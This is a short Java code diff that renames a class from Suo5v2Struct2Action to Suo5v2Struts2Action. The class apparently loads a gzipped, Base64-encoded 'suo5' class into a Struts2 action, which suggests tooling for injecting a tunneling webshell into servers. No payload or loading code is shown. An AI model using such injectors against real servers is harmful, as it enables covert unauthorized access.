@@ -14,11 +14,11 @@ import java.util.zip.GZIPInputStream;
  * @author ReaJason
  * @since 2025/12/9
  */
-public class Suo5v2Struct2Action {
+public class Suo5v2Struts2Action {
     private static Class<?> suo5V2Class;
     private static String suo5V2GZipBase64;
 
-    public Suo5v2Struct2Action() {
+    public Suo5v2Struts2Action() {
     }
 
     public void execute() throws Exception {
